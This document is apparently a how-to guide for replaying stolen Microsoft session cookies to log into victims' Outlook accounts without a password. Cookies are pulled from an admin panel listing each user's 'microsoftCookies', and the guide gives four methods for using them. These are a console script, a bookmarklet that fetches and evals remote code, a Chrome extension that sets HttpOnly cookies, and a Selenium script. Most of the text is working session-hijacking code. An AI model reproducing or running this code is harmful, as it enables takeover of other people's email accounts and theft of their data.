# Cookie Injection Tutorial

## Method 1: Browser Console (Manual)

### Step-by-Step:

1. **Get the injection script from admin dashboard**
   - Go to `http://localhost:8000/admin`
   - Click on a user
   - Copy the injection script URL: `/admin/inject-cookies/USER_ID`

2. **Open the target website**
   - Open a new tab
   - Go to `https://outlook.office.com`

3. **Open Developer Console**
   - Press `F12` or `Ctrl+Shift+J` (Windows)
   - Press `Cmd+Option+J` (Mac)

4. **Paste and run the injection script**
   ```javascript
   // Example: Inject cookies manually
   let cookies = [
     {name: "sessionId", value: "abc123", domain: ".office.com", path: "/", secure: true},
     {name: "authToken", value: "xyz789", domain: ".office.com", path: "/", secure: true}
   ];

   cookies.forEach(cookie => {
     document.cookie = `${cookie.name}=${cookie.value}; Max-Age=31536000; domain=${cookie.domain}; path=${cookie.path}; Secure; SameSite=None`;
   });
   ```

5. **Refresh the page**
   - Press `F5` or `Ctrl+R`
   - You should be logged in!

---

## Method 2: Bookmarklet (One-Click)

### Create a bookmarklet:

1. Create a new bookmark in your browser
2. Set the URL to:
   ```javascript
   javascript:(function(){fetch('http://localhost:8000/admin/inject-cookies/USER_ID').then(r=>r.text()).then(eval).then(()=>location.reload())})();
   ```
3. Replace `USER_ID` with actual user ID
4. Go to `outlook.office.com`
5. Click the bookmark
6. Cookies injected + page refreshes = You're in!

---

## Method 3: Browser Extension (Most Powerful)

### Chrome Extension that injects cookies:

**manifest.json:**
```json
{
  "name": "Cookie Injector",
  "version": "1.0",
  "manifest_version": 3,
  "permissions": ["cookies", "storage"],
  "host_permissions": ["https://*.office.com/*"],
  "action": {
    "default_popup": "popup.html"
  }
}
```

**popup.html:**
```html
<!DOCTYPE html>
<html>
<body>
  <button id="inject">Inject Cookies</button>
  <script src="popup.js"></script>
</body>
</html>
```

**popup.js:**
```javascript
document.getElementById('inject').addEventListener('click', async () => {
  // Fetch cookies from your server
  const response = await fetch('http://localhost:8000/admin/users');
  const data = await response.json();
  const user = data.users[0]; // First user
  
  // Inject each cookie
  for (let cookie of user.microsoftCookies) {
    await chrome.cookies.set({
      url: 'https://outlook.office.com',
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly
    });
  }
  
  alert('Cookies injected! Open outlook.office.com');
});
```

---

## Method 4: Automated Script (Python + Selenium)

```python
from selenium import webdriver
import requests

# Get cookies from your server
response = requests.get('http://localhost:8000/admin/users')
users = response.json()['users']
cookies = users[0]['microsoftCookies']

# Open browser
driver = webdriver.Chrome()
driver.get('https://outlook.office.com')

# Inject cookies
for cookie in cookies:
    driver.add_cookie({
        'name': cookie['name'],
        'value': cookie['value'],
        'domain': cookie['domain'],
        'path': cookie['path'],
        'secure': cookie['secure']
    })

# Refresh to apply cookies
driver.refresh()

# Now you're logged in!
input('Press Enter to close...')
driver.quit()
```

---

## Important Notes

### ⚠️ Limitations:

1. **HttpOnly cookies cannot be injected via JavaScript**
   - Must use browser extension or Selenium
   - Or use EditThisCookie Chrome extension

2. **Domain restrictions**
   - Can only inject cookies for the current domain
   - Must be on `outlook.office.com` to inject `.office.com` cookies

3. **HTTPS required for Secure cookies**
   - Secure cookies only work on HTTPS sites

### ✅ Best Practices:

1. **Use browser extensions** for full cookie injection (including HttpOnly)
2. **Use Selenium** for automated testing
3. **Use bookmarklets** for quick manual injection
4. **Check cookie expiry** - expired cookies won't work

---

## Testing Your Setup

1. Capture cookies from a test account
2. Open incognito window
3. Go to outlook.office.com
4. Inject cookies using any method above
5. Refresh page
6. If successful, you'll be logged in without password!
